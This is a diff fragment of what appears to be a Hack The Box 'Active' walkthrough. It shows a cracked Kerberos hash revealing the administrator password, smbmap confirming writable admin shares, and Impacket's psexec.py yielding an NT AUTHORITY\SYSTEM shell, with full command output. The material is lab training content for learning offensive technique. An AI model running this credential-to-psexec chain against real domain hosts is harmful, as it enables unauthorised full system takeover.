@@ -355,3 +355,47 @@ d54f22840b7a0a6000c8e8137e04a898a4fd1d87739bf5428d748086f0166b35c181729cc62b41ba
 94e349b57906ee8deaf026b3daa89e7c3fc747a6a31ae08376da259f3118370bef86b6e7c2f88d66400eccb122dec8028223f6dcde29ffaa5b83ecb1c3780a782a5797c527a26a7b51b62db3e4865ebc2a0a0d2c931550de
 cb3e7ae581b59f070dd33e423a90ec2ef66982a1b6336afe968fa93f5dd2880a313dc05d4e5cf104b6d9a8316b9fe3dc16e057e0f5c835e111ab92795fb0033541916a57df8f8e6b8cc25ecff2775282ccee110c49376c2c
 ec6b7bb95c265f1466994da89e69605594ead28d24212a137ee20197d8aa95f243c347e02616f40f4071c33f749f5b94d1259fd32174:Ticketmaster1968
+
+
+smbmap -H 10.10.10.100 -d active.htb -u administrator -p Ticketmaster1968
+[+] Finding open SMB ports....
+[+] User SMB session establishd on 10.10.10.100...
+[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
+        Disk                                                    Permissions
+        ----                                                    -----------
+        ADMIN$                                                  READ, WRITE
+        C$                                                      READ, WRITE
+        IPC$                                                    NO ACCESS
+        NETLOGON                                                READ, WRITE
+        Replication                                             READ ONLY
+        SYSVOL                                                  READ, WRITE
+        [!] Unable to remove test directory at \\10.10.10.100\SYSVOL\vnCfhEJMWA, plreae remove manually
+        Users                                                   READ ONLY
+
+
+System Shell
+
+But of course I want to get a shell. Now that the shares are writable and I have administrator access, I can get a shell with PSExec. There’s a bunch of ways to do this directly from Kali. Sticking with the Impacket tools, I’ll use psexec.py:
+
+┌──(root💀sac)-[~/Downloads/hackthebox/Active]
+└─# cp /usr/share/doc/python3-impacket/examples/psexec.py .
+                                                                                                                                                                                            
+┌──(root💀sac)-[~/Downloads/hackthebox/Active]
+└─# python3 psexec.py active.htb/administrator@10.129.186.200
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Requesting shares on 10.129.186.200.....
+[*] Found writable share ADMIN$
+[*] Uploading file apEjGEsd.exe
+[*] Opening SVCManager on 10.129.186.200.....
+[*] Creating service KAgX on 10.129.186.200.....
+[*] Starting service KAgX.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> 
